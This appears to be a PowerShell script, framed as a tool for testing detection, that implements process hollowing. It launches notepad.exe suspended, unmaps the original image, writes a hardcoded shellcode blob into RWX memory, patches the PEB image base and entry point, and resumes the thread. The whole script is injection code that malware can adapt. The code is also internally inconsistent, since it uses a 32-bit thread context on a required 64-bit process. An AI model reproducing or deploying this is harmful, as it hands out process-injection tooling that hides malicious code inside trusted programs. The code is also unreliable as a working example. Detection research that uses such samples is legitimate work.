# Process Hollowing Test Script for Detection Testing
# WARNING: This is for security research and testing only!

param(
    [string]$TargetPath = "C:\Windows\System32\notepad.exe",
    [switch]$Verbose = $false
)

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class ProcessHollowing
{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT
    {
        public uint ContextFlags;
        public uint Dr0;
        public uint Dr1;
        public uint Dr2;
        public uint Dr3;
        public uint Dr6;
        public uint Dr7;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 112)]
        public byte[] FloatSave;
        public uint SegGs;
        public uint SegFs;
        public uint SegEs;
        public uint SegDs;
        public uint Edi;
        public uint Esi;
        public uint Ebx;
        public uint Edx;
        public uint Ecx;
        public uint Eax;
        public uint Ebp;
        public uint Eip;
        public uint SegCs;
        public uint EFlags;
        public uint Esp;
        public uint SegSs;
    }

    public const uint CREATE_SUSPENDED = 0x4;
    public const uint CONTEXT_FULL = 0x10007;
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        int nSize,
        out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);

    public static PROCESS_INFORMATION CreateSuspendedProcess(string targetPath)
    {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        si.cb = (uint)Marshal.SizeOf(si);

        bool success = CreateProcess(
            targetPath,
            null,
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            CREATE_SUSPENDED,
            IntPtr.Zero,
            null,
            ref si,
            out pi);

        if (!success)
        {
            throw new Exception("Failed to create suspended process. Error: " + Marshal.GetLastWin32Error());
        }

        return pi;
    }

    public static CONTEXT GetThreadContext(IntPtr hThread)
    {
        CONTEXT ctx = new CONTEXT();
        ctx.ContextFlags = CONTEXT_FULL;
        ctx.FloatSave = new byte[112];

        if (!GetThreadContext(hThread, ref ctx))
        {
            throw new Exception("Failed to get thread context. Error: " + Marshal.GetLastWin32Error());
        }

        return ctx;
    }

    public static IntPtr GetImageBase(IntPtr hProcess, uint pebAddress)
    {
        byte[] buffer = new byte[4];
        IntPtr bytesRead;

        if (!ReadProcessMemory(hProcess, new IntPtr(pebAddress + 8), buffer, 4, out bytesRead))
        {
            throw new Exception("Failed to read image base. Error: " + Marshal.GetLastWin32Error());
        }

        return new IntPtr(BitConverter.ToUInt32(buffer, 0));
    }

    public static void UnmapViewOfSection(IntPtr hProcess, IntPtr imageBase)
    {
        int status = NtUnmapViewOfSection(hProcess, imageBase);
        if (status != 0)
        {
            throw new Exception("Failed to unmap view of section. Status: 0x" + status.ToString("X"));
        }
    }

    public static IntPtr AllocateMemory(IntPtr hProcess, IntPtr preferredBase, uint size)
    {
        IntPtr allocatedMemory = VirtualAllocEx(
            hProcess,
            preferredBase,
            size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (allocatedMemory == IntPtr.Zero)
        {
            // Try allocating anywhere if preferred base fails
            allocatedMemory = VirtualAllocEx(
                hProcess,
                IntPtr.Zero,
                size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);

            if (allocatedMemory == IntPtr.Zero)
            {
                throw new Exception("Failed to allocate memory. Error: " + Marshal.GetLastWin32Error());
            }
        }

        return allocatedMemory;
    }

    public static void WritePayload(IntPtr hProcess, IntPtr address, byte[] payload)
    {
        IntPtr bytesWritten;
        if (!WriteProcessMemory(hProcess, address, payload, payload.Length, out bytesWritten))
        {
            throw new Exception("Failed to write payload. Error: " + Marshal.GetLastWin32Error());
        }
    }

    public static void UpdateImageBase(IntPtr hProcess, uint pebAddress, IntPtr newBase)
    {
        byte[] buffer = BitConverter.GetBytes((uint)newBase);
        IntPtr bytesWritten;

        if (!WriteProcessMemory(hProcess, new IntPtr(pebAddress + 8), buffer, 4, out bytesWritten))
        {
            throw new Exception("Failed to update image base. Error: " + Marshal.GetLastWin32Error());
        }
    }

    public static void UpdateEntryPoint(IntPtr hThread, CONTEXT ctx, IntPtr newEntryPoint)
    {
        ctx.Eax = (uint)newEntryPoint;

        if (!SetThreadContext(hThread, ref ctx))
        {
            throw new Exception("Failed to update entry point. Error: " + Marshal.GetLastWin32Error());
        }
    }

    public static void ResumeExecution(IntPtr hThread)
    {
        if (ResumeThread(hThread) == 0xFFFFFFFF)
        {
            throw new Exception("Failed to resume thread. Error: " + Marshal.GetLastWin32Error());
        }
    }
}
"@

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")

    $timestamp = Get-Date -Format "HH:mm:ss"
    $color = switch ($Level) {
        "SUCCESS" { "Green" }
        "ERROR" { "Red" }
        "WARNING" { "Yellow" }
        default { "White" }
    }

    Write-Host "[$timestamp] $Message" -ForegroundColor $color
}

function Invoke-ProcessHollowing {
    param([string]$TargetPath)

    try {
        Write-Log "=== Process Hollowing Test Tool (PowerShell) ===" "SUCCESS"
        Write-Log "[!] This is for security research and testing only!" "WARNING"
        Write-Log ""

        # Simple MessageBox shellcode for testing
        $payload = [byte[]]@(
            0x31, 0xd2, 0xb2, 0x30, 0x64, 0x8b, 0x12, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x1c, 0x8b, 0x42,
            0x08, 0x8b, 0x72, 0x20, 0x8b, 0x12, 0x80, 0x7e, 0x0c, 0x33, 0x75, 0xf2, 0x89, 0xc7, 0x03,
            0x78, 0x3c, 0x8b, 0x57, 0x78, 0x01, 0xc2, 0x8b, 0x7a, 0x20, 0x01, 0xc7, 0x89, 0xdd, 0x8b,
            0x34, 0xaf, 0x01, 0xc6, 0x45, 0x81, 0x3e, 0x4c, 0x6f, 0x61, 0x64, 0x75, 0xf2, 0x81, 0x7e,
            0x08, 0x4c, 0x69, 0x62, 0x72, 0x75, 0xe9, 0x8b, 0x7a, 0x24, 0x01, 0xc7, 0x66, 0x8b, 0x2c,
            0x6f, 0x8b, 0x7a, 0x1c, 0x01, 0xc7, 0x8b, 0x7c, 0xaf, 0xfc, 0x01, 0xc7, 0x89, 0xf8, 0x68,
            0x65, 0x72, 0x33, 0x32, 0x68, 0x6b, 0x65, 0x72, 0x6e, 0x68, 0x55, 0x73, 0x65, 0x72, 0x54,
            0xff, 0xd0, 0x68, 0x6f, 0x78, 0x41, 0x00, 0x68, 0x61, 0x67, 0x65, 0x42, 0x68, 0x4d, 0x65,
            0x73, 0x73, 0x54, 0x50, 0xff, 0xd0, 0x68, 0x72, 0x65, 0x64, 0x21, 0x68, 0x6f, 0x6c, 0x6c,
            0x6f, 0x68, 0x48, 0x65, 0x6c, 0x6c, 0x8b, 0xcc, 0x6a, 0x00, 0x54, 0x6a, 0x00, 0x54, 0xff,
            0xd0, 0x6a, 0x00, 0xff, 0xd7
        )

        # Step 1: Create suspended process
        Write-Log "[+] Creating suspended process: $TargetPath"
        $pi = [ProcessHollowing]::CreateSuspendedProcess($TargetPath)
        Write-Log "[+] Process created successfully. PID: $($pi.dwProcessId)" "SUCCESS"

        # Step 2: Get thread context
        Write-Log "[+] Getting thread context..."
        $ctx = [ProcessHollowing]::GetThreadContext($pi.hThread)
        Write-Log "[+] Thread context retrieved successfully" "SUCCESS"

        # Step 3: Get image base from PEB
        Write-Log "[+] Reading image base from PEB..."
        $imageBase = [ProcessHollowing]::GetImageBase($pi.hProcess, $ctx.Ebx)
        Write-Log "[+] Image base: 0x$($imageBase.ToString('X'))" "SUCCESS"

        # Step 4: Unmap target image
        Write-Log "[+] Unmapping target image..."
        [ProcessHollowing]::UnmapViewOfSection($pi.hProcess, $imageBase)
        Write-Log "[+] Target image unmapped successfully" "SUCCESS"

        # Step 5: Allocate memory for payload
        Write-Log "[+] Allocating memory for payload..."
        $hollowAddress = [ProcessHollowing]::AllocateMemory($pi.hProcess, $imageBase, $payload.Length)
        Write-Log "[+] Memory allocated at: 0x$($hollowAddress.ToString('X'))" "SUCCESS"

        # Step 6: Write payload
        Write-Log "[+] Writing payload to allocated memory..."
        [ProcessHollowing]::WritePayload($pi.hProcess, $hollowAddress, $payload)
        Write-Log "[+] Payload written successfully" "SUCCESS"

        # Step 7: Update image base in PEB
        Write-Log "[+] Updating image base in PEB..."
        [ProcessHollowing]::UpdateImageBase($pi.hProcess, $ctx.Ebx, $hollowAddress)
        Write-Log "[+] Image base updated successfully" "SUCCESS"

        # Step 8: Update entry point
        Write-Log "[+] Updating entry point..."
        [ProcessHollowing]::UpdateEntryPoint($pi.hThread, $ctx, $hollowAddress)
        Write-Log "[+] Entry point updated successfully" "SUCCESS"

        # Step 9: Resume execution
        Write-Log "[!] About to resume execution. PID: $($pi.dwProcessId)" "WARNING"
        Write-Log "[!] This is your chance to attach debuggers or monitoring tools" "WARNING"
        Read-Host "[!] Press Enter to continue"

        Write-Log "[+] Resuming thread execution..."
        [ProcessHollowing]::ResumeExecution($pi.hThread)
        Write-Log "[+] Thread resumed successfully" "SUCCESS"

        Write-Log "[+] Process hollowing completed successfully!" "SUCCESS"
        Write-Log "[+] Monitor PID $($pi.dwProcessId) with your detection tools" "SUCCESS"

        # Cleanup
        [ProcessHollowing]::CloseHandle($pi.hProcess)
        [ProcessHollowing]::CloseHandle($pi.hThread)

        Read-Host "[+] Press Enter to exit"

    }
    catch {
        Write-Log "[-] Error: $($_.Exception.Message)" "ERROR"
        return 1
    }

    return 0
}

# Main execution
if (-not [Environment]::Is64BitProcess) {
    Write-Log "[-] This script requires a 64-bit PowerShell process" "ERROR"
    exit 1
}

if (-not (Test-Path $TargetPath)) {
    Write-Log "[-] Target path does not exist: $TargetPath" "ERROR"
    exit 1
}

# Check if running as administrator
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Log "[-] This script requires administrator privileges" "WARNING"
    Write-Log "[!] Some operations may fail without proper privileges" "WARNING"
}

Invoke-ProcessHollowing -TargetPath $TargetPath